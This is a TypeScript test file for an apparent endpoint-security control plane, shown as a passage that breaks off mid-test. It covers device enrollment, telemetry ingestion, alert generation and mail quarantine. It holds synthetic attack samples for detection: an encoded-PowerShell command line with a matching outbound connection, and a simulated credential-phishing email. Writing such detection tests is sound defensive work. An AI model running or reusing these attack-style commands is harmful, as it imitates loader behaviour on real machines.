import assert from "node:assert/strict";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";

import { buildServer } from "./app.ts";
import { DEFAULT_ADMIN_MFA_SECRET, DEFAULT_ADMIN_PASSWORD, DEFAULT_ADMIN_USERNAME, generateTotpCode } from "./adminAuth.ts";
import { createFileBackedControlPlaneStore } from "./controlPlaneStore.ts";
import { scoreDeviceRisk } from "./deviceRiskScoring.ts";
import { createFileBackedMailStore } from "./mailStore.ts";
import { createEmptyState, createSeedState } from "./seedState.ts";

async function createTestApp() {
  const tempDir = await mkdtemp(join(tmpdir(), "antivirus-control-plane-"));
  const stateFilePath = join(tempDir, "state.json");
  const mailStateFilePath = join(tempDir, "mail-state.json");
  const store = createFileBackedControlPlaneStore({
    stateFilePath,
    commandChannelUrl: "wss://test.local/api/v1/commands",
    seedDemoData: true,
    now: (() => {
      let tick = 0;
      return () => `2026-04-08T09:00:${String(tick++).padStart(2, "0")}Z`;
    })()
  });
  const mailStore = createFileBackedMailStore({
    stateFilePath: mailStateFilePath,
    seedDemoData: true,
    now: (() => {
      let tick = 0;
      return () => `2026-04-08T09:10:${String(tick++).padStart(2, "0")}Z`;
    })()
  });
  const app = buildServer({ store, mailStore });

  await app.ready();

  const adminHeaders = await loginBootstrapAdmin(app);

  return {
    app,
    stateFilePath,
    adminHeaders,
    async cleanup() {
      await app.close();
      await rm(tempDir, { recursive: true, force: true });
    }
  };
}

async function createTestAppWithState(rawState: object) {
  const tempDir = await mkdtemp(join(tmpdir(), "antivirus-control-plane-"));
  const stateFilePath = join(tempDir, "state.json");
  const mailStateFilePath = join(tempDir, "mail-state.json");
  await writeFile(stateFilePath, `${JSON.stringify(rawState, null, 2)}\n`, "utf8");

  const store = createFileBackedControlPlaneStore({
    stateFilePath,
    commandChannelUrl: "wss://test.local/api/v1/commands",
    now: (() => {
      let tick = 0;
      return () => `2026-04-08T10:00:${String(tick++).padStart(2, "0")}Z`;
    })()
  });
  const mailStore = createFileBackedMailStore({
    stateFilePath: mailStateFilePath,
    seedDemoData: true,
    now: (() => {
      let tick = 0;
      return () => `2026-04-08T10:10:${String(tick++).padStart(2, "0")}Z`;
    })()
  });
  const app = buildServer({ store, mailStore });

  await app.ready();

  const adminHeaders = await loginBootstrapAdmin(app);

  return {
    app,
    stateFilePath,
    adminHeaders,
    async cleanup() {
      await app.close();
      await rm(tempDir, { recursive: true, force: true });
    }
  };
}

async function createTestAppWithRawState(rawStateText: string) {
  const tempDir = await mkdtemp(join(tmpdir(), "antivirus-control-plane-"));
  const stateFilePath = join(tempDir, "state.json");
  const mailStateFilePath = join(tempDir, "mail-state.json");
  await writeFile(stateFilePath, rawStateText, "utf8");

  const store = createFileBackedControlPlaneStore({
    stateFilePath,
    commandChannelUrl: "wss://test.local/api/v1/commands",
    now: (() => {
      let tick = 0;
      return () => `2026-04-08T10:20:${String(tick++).padStart(2, "0")}Z`;
    })()
  });
  const mailStore = createFileBackedMailStore({
    stateFilePath: mailStateFilePath,
    seedDemoData: true,
    now: (() => {
      let tick = 0;
      return () => `2026-04-08T10:30:${String(tick++).padStart(2, "0")}Z`;
    })()
  });
  const app = buildServer({ store, mailStore });

  await app.ready();

  const adminHeaders = await loginBootstrapAdmin(app);

  return {
    app,
    stateFilePath,
    adminHeaders,
    async cleanup() {
      await app.close();
      await rm(tempDir, { recursive: true, force: true });
    }
  };
}

async function loginBootstrapAdmin(app: { inject: (options: { method: string; url: string; payload?: unknown }) => Promise<{ statusCode: number; json(): unknown }> }) {
  const response = await app.inject({
    method: "POST",
    url: "/api/v1/admin/auth/login",
    payload: {
      username: DEFAULT_ADMIN_USERNAME,
      password: DEFAULT_ADMIN_PASSWORD,
      mfaCode: generateTotpCode(DEFAULT_ADMIN_MFA_SECRET)
    }
  });

  assert.equal(response.statusCode, 201);
  const payload = response.json() as { accessToken: string };
  return { "x-admin-session-token": payload.accessToken };
}

function deviceAuthHeaders(enrollment: { deviceApiKey?: string }) {
  return enrollment.deviceApiKey ? { "x-device-api-key": enrollment.deviceApiKey } : {};
}

test("dashboard loads seed state from persistent storage", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const response = await harness.app.inject({
    method: "GET",
    url: "/api/v1/dashboard"
  });

  assert.equal(response.statusCode, 200);

  const payload = response.json();
  assert.equal(payload.defaultPolicy.revision, "2026.04.08.1");
  assert.equal(payload.devices.length, 8);
  assert.equal(payload.alerts.length, 6);
  assert.equal(payload.recentTelemetry.length, 3);
  assert.equal(payload.recentCommands.length, 3);
  assert.equal(payload.quarantineItems.length, 2);

  const persisted = JSON.parse(await readFile(harness.stateFilePath, "utf8")) as {
    devices: Array<{ hostname: string }>;
  };
  assert.equal(persisted.devices[0].hostname, "FINANCE-LAPTOP-07");
});

test("an empty control-plane state file recovers to a usable dashboard", async (t) => {
  const harness = await createTestAppWithRawState("");
  t.after(async () => {
    await harness.cleanup();
  });

  const response = await harness.app.inject({
    method: "GET",
    url: "/api/v1/dashboard"
  });

  assert.equal(response.statusCode, 200);
  const payload = response.json() as {
    defaultPolicy: { name: string };
    devices: Array<unknown>;
  };
  assert.equal(payload.defaultPolicy.name, "Business Baseline");
  assert.equal(payload.devices.length, 0);

  const persisted = JSON.parse(await readFile(harness.stateFilePath, "utf8")) as {
    devices: Array<unknown>;
    defaultPolicy: { name: string };
  };
  assert.equal(persisted.defaultPolicy.name, "Business Baseline");
  assert.equal(persisted.devices.length, 0);
});

test("enrolling the same serial number reuses the existing device record", async (t) => {
  const harness = await createTestAppWithState(createEmptyState("2026-04-08T10:20:00.000Z"));
  t.after(async () => {
    await harness.cleanup();
  });

  const firstResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "PM-DELL",
      osVersion: "Windows 10.0 Build 26200",
      serialNumber: "LAB-DUPE-001"
    }
  });

  assert.equal(firstResponse.statusCode, 201);
  const firstEnrollment = firstResponse.json() as { deviceId: string };

  const secondResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "PM-DELL",
      osVersion: "Windows 10.0 Build 26200",
      serialNumber: "LAB-DUPE-001"
    }
  });

  assert.equal(secondResponse.statusCode, 201);
  const secondEnrollment = secondResponse.json() as { deviceId: string };
  assert.equal(secondEnrollment.deviceId, firstEnrollment.deviceId);

  const dashboard = await harness.app.inject({
    method: "GET",
    url: "/api/v1/dashboard"
  });

  assert.equal(dashboard.statusCode, 200);
  const dashboardPayload = dashboard.json() as { devices: Array<{ id: string; serialNumber: string }> };
  assert.equal(dashboardPayload.devices.length, 1);
  assert.equal(dashboardPayload.devices[0].id, firstEnrollment.deviceId);
  assert.equal(dashboardPayload.devices[0].serialNumber, "LAB-DUPE-001");
});

test("duplicate stored device records collapse to one device on load", async (t) => {
  const rawState = createEmptyState("2026-04-08T11:00:00.000Z") as any;
  rawState.devices = [
    {
      id: "device-001",
      hostname: "PM-DELL",
      osVersion: "Windows 10.0 Build 26200",
      agentVersion: "0.1.0-alpha",
      platformVersion: "platform-0.1.0",
      serialNumber: "SERIAL-1234",
      enrolledAt: "2026-04-08T10:00:00.000Z",
      lastSeenAt: "2026-04-08T10:05:00.000Z",
      lastPolicySyncAt: null,
      lastTelemetryAt: null,
      healthState: "degraded",
      isolated: false,
      policyId: "policy-default",
      policyName: "Business Baseline",
      privateIpAddresses: ["10.252.0.102"],
      publicIpAddress: null,
      lastLoggedOnUser: null,
      installedSoftware: []
    },
    {
      id: "device-002",
      hostname: "PM-DELL",
      osVersion: "Windows 10.0 Build 26200",
      agentVersion: "0.1.0-alpha",
      platformVersion: "platform-0.1.0",
      serialNumber: "SERIAL-1234",
      enrolledAt: "2026-04-08T10:10:00.000Z",
      lastSeenAt: "2026-04-08T10:20:00.000Z",
      lastPolicySyncAt: "2026-04-08T10:18:00.000Z",
      lastTelemetryAt: "2026-04-08T10:19:00.000Z",
      healthState: "healthy",
      isolated: false,
      policyId: "policy-default",
      policyName: "Business Baseline",
      privateIpAddresses: ["10.252.0.103"],
      publicIpAddress: null,
      lastLoggedOnUser: "PM-DELL\\mattj",
      installedSoftware: []
    }
  ];
  rawState.telemetry = [
    {
      eventId: "telemetry-002",
      deviceId: "device-002",
      hostname: "PM-DELL",
      eventType: "device.heartbeat",
      source: "agent-service",
      summary: "Heartbeat received.",
      occurredAt: "2026-04-08T10:20:00.000Z",
      ingestedAt: "2026-04-08T10:20:01.000Z",
      payloadJson: "{}"
    }
  ];

  const harness = await createTestAppWithRawState(JSON.stringify(rawState, null, 2));
  t.after(async () => {
    await harness.cleanup();
  });

  const dashboard = await harness.app.inject({
    method: "GET",
    url: "/api/v1/dashboard"
  });

  assert.equal(dashboard.statusCode, 200);
  const dashboardPayload = dashboard.json() as { devices: Array<{ id: string; lastSeenAt: string }> };
  assert.equal(dashboardPayload.devices.length, 1);
  assert.equal(dashboardPayload.devices[0].id, "device-001");
  assert.equal(dashboardPayload.devices[0].lastSeenAt, "2026-04-08T10:20:00.000Z");

  const persisted = JSON.parse(await readFile(harness.stateFilePath, "utf8")) as {
    devices: Array<{ id: string; lastSeenAt: string }>;
    telemetry: Array<{ deviceId: string }>;
  };
  assert.equal(persisted.devices.length, 1);
  assert.equal(persisted.devices[0].id, "device-001");
  assert.equal(persisted.telemetry[0].deviceId, "device-001");
});

test("mail dashboard exposes seeded domains, messages, and quarantine records", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const dashboardResponse = await harness.app.inject({
    method: "GET",
    url: "/api/v1/mail/dashboard"
  });

  assert.equal(dashboardResponse.statusCode, 200);
  const dashboardPayload = dashboardResponse.json() as {
    domains: Array<{ domain: string }>;
    recentMessages: Array<{ subject: string; verdict: string; deliveryAction: string }>;
    quarantineItems: Array<{ subject: string; status: string }>;
    recentActions: Array<{ actionType: string }>;
    defaultPolicy: { name: string };
  };

  assert.equal(dashboardPayload.defaultPolicy.name, "Inbound Mail Baseline");
  assert.equal(dashboardPayload.domains.length, 2);
  assert.equal(dashboardPayload.recentMessages.length, 3);
  assert.equal(dashboardPayload.quarantineItems.length, 2);
  assert.equal(dashboardPayload.recentActions.length, 1);
  assert.equal(dashboardPayload.recentMessages[0].subject, "Updated payroll portal instructions");

  const messagesResponse = await harness.app.inject({
    method: "GET",
    url: "/api/v1/mail/messages?verdict=phish&limit=10"
  });

  assert.equal(messagesResponse.statusCode, 200);
  const messagesPayload = messagesResponse.json() as {
    items: Array<{ subject: string; verdict: string; deliveryAction: string }>;
  };

  assert.equal(messagesPayload.items.length, 1);
  assert.equal(messagesPayload.items[0].verdict, "phish");
  assert.equal(messagesPayload.items[0].deliveryAction, "quarantined");
});

test("simulated inbound mail can be quarantined, released, and purged", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const simulateResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/mail/simulate",
    payload: {
      sender: "security-update@contoso-alerts.example",
      recipients: ["finance@contoso-internal.test"],
      subject: "Secure document review",
      summary: "Simulation injected a credential-harvest lure for workflow validation.",
      verdict: "phish",
      deliveryAction: "quarantined",
      relatedUser: "finance@contoso-internal.test",
      attachments: [
        {
          fileName: "review-link.html",
          sha256: "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
          sizeBytes: 2048,
          verdict: "phish"
        }
      ],
      urls: [
        {
          originalUrl: "https://contoso-alerts.example/review",
          verdict: "phish",
          rewriteApplied: true
        }
      ],
      auth: {
        spf: "fail",
        dkim: "none",
        dmarc: "fail",
        arc: "none"
      }
    }
  });

  assert.equal(simulateResponse.statusCode, 201);
  const simulatedMessage = simulateResponse.json() as { id: string; deliveryAction: string; domain: string };
  assert.equal(simulatedMessage.deliveryAction, "quarantined");
  assert.equal(simulatedMessage.domain, "contoso-internal.test");

  const quarantineResponse = await harness.app.inject({
    method: "GET",
    url: "/api/v1/mail/quarantine?status=quarantined&limit=10"
  });

  assert.equal(quarantineResponse.statusCode, 200);
  const quarantinePayload = quarantineResponse.json() as {
    items: Array<{ id: string; mailMessageId: string; status: string }>;
  };
  const simulatedQuarantine = quarantinePayload.items.find((item) => item.mailMessageId === simulatedMessage.id);
  assert.ok(simulatedQuarantine);
  assert.equal(simulatedQuarantine.status, "quarantined");

  const releaseResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/mail/quarantine/${simulatedQuarantine.id}/release`,
    payload: {
      requestedBy: "soc-tier1"
    }
  });

  assert.equal(releaseResponse.statusCode, 200);
  assert.equal(releaseResponse.json().status, "released");

  const messageAfterRelease = await harness.app.inject({
    method: "GET",
    url: `/api/v1/mail/messages/${simulatedMessage.id}`
  });

  assert.equal(messageAfterRelease.statusCode, 200);
  assert.equal(messageAfterRelease.json().deliveryAction, "delivered");

  const purgeResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/mail/messages/${simulatedMessage.id}/purge`,
    payload: {
      requestedBy: "soc-tier2"
    }
  });

  assert.equal(purgeResponse.statusCode, 200);
  assert.equal(purgeResponse.json().deliveryAction, "purged");

  const quarantineAfterPurge = await harness.app.inject({
    method: "GET",
    url: "/api/v1/mail/quarantine?limit=10"
  });

  assert.equal(quarantineAfterPurge.statusCode, 200);
  const finalQuarantineState = (quarantineAfterPurge.json() as { items: Array<{ mailMessageId: string; status: string }> }).items.find(
    (item) => item.mailMessageId === simulatedMessage.id
  );
  assert.ok(finalQuarantineState);
  assert.equal(finalQuarantineState.status, "purged");
});

test("enrollment, heartbeat, and policy check-in persist device state", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const enrollResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "LAB-ENDPOINT-01",
      osVersion: "Windows 11 24H2",
      serialNumber: "LAB-0001"
    }
  });

  assert.equal(enrollResponse.statusCode, 201);

  const enrollment = enrollResponse.json() as { deviceId: string; commandChannelUrl: string; deviceApiKey?: string };
  assert.match(enrollment.deviceId, /^[0-9a-f-]{36}$/);
  assert.match(enrollment.commandChannelUrl, /^wss:\/\/test\.local\/api\/v1\/commands\?/);
  assert.match(enrollment.commandChannelUrl, new RegExp(`deviceId=${enrollment.deviceId}`));
  assert.ok(enrollment.deviceApiKey);
  assert.match(enrollment.commandChannelUrl, new RegExp(`deviceApiKey=${enrollment.deviceApiKey}`));

  const heartbeatResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${enrollment.deviceId}/heartbeat`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      agentVersion: "0.1.1-alpha",
      platformVersion: "platform-0.1.1",
      healthState: "degraded",
      isolated: false
    }
  });

  assert.equal(heartbeatResponse.statusCode, 200);
  assert.equal(heartbeatResponse.json().effectivePolicyRevision, "2026.04.08.1");

  const policyCheckInResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${enrollment.deviceId}/policy-check-in`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      currentPolicyRevision: "2026.04.07.9",
      agentVersion: "0.1.1-alpha",
      platformVersion: "platform-0.1.1"
    }
  });

  assert.equal(policyCheckInResponse.statusCode, 200);
  assert.equal(policyCheckInResponse.json().changed, true);

  const devicesResponse = await harness.app.inject({
    method: "GET",
    url: "/api/v1/devices"
  });

  assert.equal(devicesResponse.statusCode, 200);

  const devicesPayload = devicesResponse.json() as {
    items: Array<{ hostname: string; agentVersion: string; healthState: string; riskScore: number | null }>;
  };
  const enrolledDeviceSummary = devicesPayload.items.find((item) => item.hostname === "LAB-ENDPOINT-01");
  assert.ok(enrolledDeviceSummary);
  assert.equal(enrolledDeviceSummary.agentVersion, "0.1.1-alpha");
  assert.equal(enrolledDeviceSummary.healthState, "degraded");
  assert.notEqual(enrolledDeviceSummary.riskScore, null);

  const persisted = JSON.parse(await readFile(harness.stateFilePath, "utf8")) as {
    devices: Array<{ hostname: string; agentVersion: string; lastPolicySyncAt: string | null }>;
  };
  const enrolledDevice = persisted.devices.find((device) => device.hostname === "LAB-ENDPOINT-01");
  assert.ok(enrolledDevice);
  assert.equal(enrolledDevice.agentVersion, "0.1.1-alpha");
  assert.notEqual(enrolledDevice.lastPolicySyncAt, null);
});

test("unknown devices require a device API key on heartbeat", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const response = await harness.app.inject({
    method: "POST",
    url: "/api/v1/devices/missing-device/heartbeat",
    payload: {
      agentVersion: "0.1.1-alpha",
      platformVersion: "platform-0.1.1",
      healthState: "healthy",
      isolated: false
    }
  });

  assert.equal(response.statusCode, 401);
  assert.equal(response.json().error, "device_api_key_required");
});

test("admin session tokens in query strings are rejected by default", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const token = harness.adminHeaders["x-admin-session-token"];
  assert.equal(typeof token, "string");

  const response = await harness.app.inject({
    method: "GET",
    url: `/api/v1/admin/auth/me?adminSessionToken=${encodeURIComponent(token)}`
  });

  assert.equal(response.statusCode, 401);
  assert.equal(response.json().error, "admin_auth_required");
});

test("device API keys in query strings are rejected by default", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const enrollResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "LAB-ENDPOINT-QUERY-AUTH",
      osVersion: "Windows 11 24H2",
      serialNumber: "LAB-QUERY-AUTH-001"
    }
  });

  assert.equal(enrollResponse.statusCode, 201);
  const enrollment = enrollResponse.json() as { deviceId: string; deviceApiKey?: string };
  assert.equal(typeof enrollment.deviceApiKey, "string");

  const heartbeatResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${enrollment.deviceId}/heartbeat?deviceApiKey=${encodeURIComponent(enrollment.deviceApiKey ?? "")}`,
    payload: {
      agentVersion: "0.1.1-alpha",
      platformVersion: "platform-0.1.1",
      healthState: "healthy",
      isolated: false
    }
  });

  assert.equal(heartbeatResponse.statusCode, 401);
  assert.equal(heartbeatResponse.json().error, "invalid_device_api_key");
});

test("telemetry batches persist and can be queried back", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const enrollResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "LAB-ENDPOINT-02",
      osVersion: "Windows 11 24H2",
      serialNumber: "LAB-0002"
    }
  });

  assert.equal(enrollResponse.statusCode, 201);
  const enrollment = enrollResponse.json() as { deviceId: string; deviceApiKey?: string };
  const { deviceId } = enrollment;

  const ingestResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${deviceId}/telemetry`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      events: [
        {
          eventId: "evt-001",
          eventType: "service.started",
          source: "agent-service",
          summary: "The endpoint service completed a sync cycle.",
          occurredAt: "2026-04-08T09:00:10Z",
          payloadJson: "{\"cycle\":1}"
        },
        {
          eventId: "evt-002",
          eventType: "process.synthetic",
          source: "telemetry-spool",
          summary: "A synthetic process event was queued for backend validation.",
          occurredAt: "2026-04-08T09:00:11Z",
          payloadJson: "{\"imagePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"}"
        }
      ]
    }
  });

  assert.equal(ingestResponse.statusCode, 200);
  assert.equal(ingestResponse.json().accepted, 2);

  const telemetryResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/telemetry?deviceId=${deviceId}&limit=10`
  });

  assert.equal(telemetryResponse.statusCode, 200);
  const telemetryPayload = telemetryResponse.json() as {
    items: Array<{ eventId: string; hostname: string; eventType: string }>;
  };
  assert.equal(telemetryPayload.items.length, 2);
  assert.ok(telemetryPayload.items.some((item) => item.eventId === "evt-001" && item.hostname === "LAB-ENDPOINT-02"));
  assert.ok(telemetryPayload.items.some((item) => item.eventId === "evt-002" && item.hostname === "LAB-ENDPOINT-02"));

  const dashboardResponse = await harness.app.inject({
    method: "GET",
    url: "/api/v1/dashboard"
  });
  assert.equal(dashboardResponse.statusCode, 200);
  assert.equal(dashboardResponse.json().recentTelemetry.length, 5);

  const persisted = JSON.parse(await readFile(harness.stateFilePath, "utf8")) as {
    telemetry: Array<{ eventId: string; deviceId: string }>;
  };
  assert.equal(persisted.telemetry.length, 5);
  assert.ok(persisted.telemetry.some((item) => item.eventId === "evt-001" && item.deviceId === deviceId));
  assert.ok(persisted.telemetry.some((item) => item.eventId === "evt-002" && item.deviceId === deviceId));
});

test("telemetry ingestion generates alerts and dedupes repeat detections", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const enrollResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "LAB-ENDPOINT-03",
      osVersion: "Windows 11 24H2",
      serialNumber: "LAB-0003"
    }
  });

  assert.equal(enrollResponse.statusCode, 201);
  const enrollment = enrollResponse.json() as { deviceId: string; deviceApiKey?: string };
  const { deviceId } = enrollment;

  const firstIngestResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${deviceId}/telemetry`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      events: [
        {
          eventId: "evt-detect-001",
          eventType: "process.started",
          source: "process-delta",
          summary: "Process powershell.exe started with PID 4412 and parent PID 920.",
          occurredAt: "2026-04-08T09:01:10Z",
          payloadJson:
            "{\"pid\":4412,\"parentPid\":920,\"imageName\":\"powershell.exe\",\"imagePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"parentImageName\":\"explorer.exe\",\"parentImagePath\":\"C:\\\\Windows\\\\explorer.exe\",\"commandLine\":\"powershell.exe -NoProfile -EncodedCommand SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAg\",\"userSid\":\"S-1-5-21-1000\",\"integrityLevel\":\"medium\",\"sessionId\":\"1\",\"signer\":\"Microsoft Windows\"}"
        },
        {
          eventId: "evt-detect-004",
          eventType: "image.loaded",
          source: "process-delta",
          summary: "Image kernel32.dll loaded into powershell.exe (PID 4412).",
          occurredAt: "2026-04-08T09:01:11Z",
          payloadJson:
            "{\"pid\":4412,\"imageName\":\"kernel32.dll\",\"imagePath\":\"C:\\\\Windows\\\\System32\\\\kernel32.dll\",\"processImageName\":\"powershell.exe\",\"processImagePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"sessionId\":\"1\",\"signer\":\"Microsoft Windows\",\"imageBase\":\"0x7ffb01000000\",\"imageSize\":\"0x1f000\"}"
        },
        {
          eventId: "evt-detect-005",
          eventType: "network.connection.snapshot",
          source: "network-wfp",
          summary: "Observed tcp4 connection for powershell.exe from 10.252.0.70:51324 to 203.0.113.50:443 (established).",
          occurredAt: "2026-04-08T09:01:12Z",
          payloadJson:
            "{\"pid\":4412,\"protocol\":\"tcp4\",\"state\":\"established\",\"localAddress\":\"10.252.0.70\",\"localPort\":51324,\"remoteAddress\":\"203.0.113.50\",\"remotePort\":443,\"processImageName\":\"powershell.exe\",\"processImagePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"}"
        },
        {
          eventId: "evt-detect-002",
          eventType: "file.created",
          source: "file-delta",
          summary: "File invoice-review.exe was created in C:\\\\Users\\\\matt\\\\Downloads.",
          occurredAt: "2026-04-08T09:01:11Z",
          payloadJson:
            "{\"path\":\"C:\\\\Users\\\\matt\\\\Downloads\\\\invoice-review.exe\",\"sizeBytes\":48256,\"lastWriteTime\":\"2026-04-08T09:01:11Z\"}"
        }
      ]
    }
  });

  assert.equal(firstIngestResponse.statusCode, 200);
  assert.equal(firstIngestResponse.json().accepted, 4);

  const firstAlertsResponse = await harness.app.inject({
    method: "GET",
    url: "/api/v1/alerts"
  });

  assert.equal(firstAlertsResponse.statusCode, 200);
  const firstAlertsPayload = firstAlertsResponse.json() as {
    items: Array<{
      id: string;
      hostname: string;
      title: string;
      severity: string;
      tacticId?: string;
      technique?: string;
      detectedAt: string;
      fingerprint?: string;
      summary: string;
    }>;
  };

  assert.equal(firstAlertsPayload.items.length, 8);

  const powerShellAlert = firstAlertsPayload.items.find(
    (alert) => alert.hostname === "LAB-ENDPOINT-03" && alert.title === "PowerShell execution observed"
  );
  assert.ok(powerShellAlert);
  assert.equal(powerShellAlert.severity, "high");
  assert.equal(powerShellAlert.tacticId, "TA0002");
  assert.equal(powerShellAlert.technique, "T1059.001");
  assert.match(powerShellAlert.summary, /post-exploitation behavior/i);

  const powerShellDetailResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/alerts/${powerShellAlert.id}`
  });

  assert.equal(powerShellDetailResponse.statusCode, 200);
  const powerShellDetail = powerShellDetailResponse.json() as {
    alert: { id: string; tacticId?: string };
    device: { id: string } | null;
    playbook: {
      mode: string;
      title: string;
      summary: string;
      evidenceToPreserve: string[];
      actions: Array<{
        id: string;
        category: string;
        title: string;
        detail: string;
        reason: string;
        commandType?: string;
        targetPath?: string;
        automationEligible: boolean;
        approvalRequired: boolean;
      }>;
    };
    behaviorChain: {
      score: number;
      narrative: string;
      whatHappened: string;
      whySuspicious: string;
      blocked: string;
      atRisk: string;
      tacticIds: string[];
      techniqueIds: string[];
      steps: Array<{
        id: string;
        category: string;
        title: string;
        summary: string;
        source: string;
        blocked?: boolean;
        atRisk?: string;
        tacticId?: string;
        techniqueId?: string;
      }>;
    };
    matchingTelemetry: Array<{
      eventId: string;
      processId?: number;
      parentProcessId?: number;
      processImageName?: string;
      processImagePath?: string;
      parentProcessImageName?: string;
      parentProcessImagePath?: string;
      processCommandLine?: string;
      processUserSid?: string;
      processIntegrityLevel?: string;
      processSessionId?: string;
      processSigner?: string;
      processExitCode?: number;
      moduleImageName?: string;
      moduleImagePath?: string;
      moduleImageBase?: string;
      moduleImageSize?: string;
    }>;
    relatedAlerts: Array<{ title: string }>;
    evidence: Array<{ recordId: string }>;
    quarantineItems: Array<{ recordId: string }>;
  };
  assert.equal(powerShellDetail.alert.id, powerShellAlert.id);
  assert.equal(powerShellDetail.device?.id, deviceId);
  assert.equal(powerShellDetail.playbook.mode, "containment");
  assert.ok(powerShellDetail.playbook.actions.some((action) => action.commandType === "device.isolate"));
  assert.ok(powerShellDetail.playbook.actions.some((action) => action.commandType === "process.tree.terminate"));
  assert.ok(powerShellDetail.playbook.evidenceToPreserve.some((item) => /process lineage/i.test(item)));
  assert.ok(powerShellDetail.behaviorChain.score >= 70);
  assert.equal(powerShellDetail.behaviorChain.tacticIds.includes("TA0002"), true);
  assert.equal(powerShellDetail.behaviorChain.tacticIds.includes("TA0011"), true);
  assert.equal(powerShellDetail.behaviorChain.steps.some((step) => step.category === "process"), true);
  assert.equal(powerShellDetail.behaviorChain.steps.some((step) => step.category === "module"), true);
  assert.equal(powerShellDetail.behaviorChain.steps.some((step) => step.category === "network" && step.tacticId === "TA0011"), true);
  assert.match(powerShellDetail.behaviorChain.whatHappened, /powershell\.exe/i);
  assert.match(powerShellDetail.behaviorChain.whySuspicious, /encoded|network|loader/i);
  assert.ok(powerShellDetail.matchingTelemetry.some((item) => item.eventId === "evt-detect-001"));
  assert.equal(powerShellDetail.matchingTelemetry[0].processImageName, "powershell.exe");
  assert.equal(powerShellDetail.matchingTelemetry[0].parentProcessImageName, "explorer.exe");
  assert.match(powerShellDetail.matchingTelemetry[0].processCommandLine ?? "", /EncodedCommand/i);
  assert.equal(powerShellDetail.matchingTelemetry[0].processIntegrityLevel, "medium");
  assert.equal(powerShellDetail.matchingTelemetry[0].processSigner, "Microsoft Windows");
  assert.ok(powerShellDetail.relatedAlerts.some((item) => item.title === "Executable dropped in monitored folder"));
  assert.equal(powerShellDetail.evidence.length, 0);
  assert.equal(powerShellDetail.quarantineItems.length, 0);

  const deviceDetailResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/devices/${deviceId}`
  });

  assert.equal(deviceDetailResponse.statusCode, 200);
  const deviceDetail = deviceDetailResponse.json() as {
    telemetry: Array<{
      eventId: string;
      processImageName?: string;
      processCommandLine?: string;
      processSigner?: string;
      moduleImageName?: string;
      processImagePath?: string;
      moduleImagePath?: string;
    }>;
  };
  assert.ok(deviceDetail.telemetry.some((item) => item.eventId === "evt-detect-001" && item.processImageName === "powershell.exe"));
  assert.ok(
    deviceDetail.telemetry.some(
      (item) => item.eventId === "evt-detect-004" && item.moduleImageName === "kernel32.dll" && item.processImageName === "powershell.exe"
    )
  );

  const fileDropAlert = firstAlertsPayload.items.find(
    (alert) => alert.hostname === "LAB-ENDPOINT-03" && alert.title === "Executable dropped in monitored folder"
  );
  assert.ok(fileDropAlert);
  assert.equal(fileDropAlert.severity, "high");
  assert.equal(fileDropAlert.technique, "T1204.002");

  const secondIngestResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${deviceId}/telemetry`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      events: [
        {
          eventId: "evt-detect-003",
          eventType: "process.started",
          source: "process-delta",
          summary: "Process powershell.exe started with PID 7780 and parent PID 1044.",
          occurredAt: "2026-04-08T09:05:00Z",
          payloadJson: "{\"pid\":7780,\"parentPid\":1044,\"imageName\":\"powershell.exe\"}"
        }
      ]
    }
  });

  assert.equal(secondIngestResponse.statusCode, 200);
  assert.equal(secondIngestResponse.json().accepted, 1);

  const secondAlertsResponse = await harness.app.inject({
    method: "GET",
    url: "/api/v1/alerts"
  });

  assert.equal(secondAlertsResponse.statusCode, 200);
  const secondAlertsPayload = secondAlertsResponse.json() as {
    items: Array<{
      hostname: string;
      title: string;
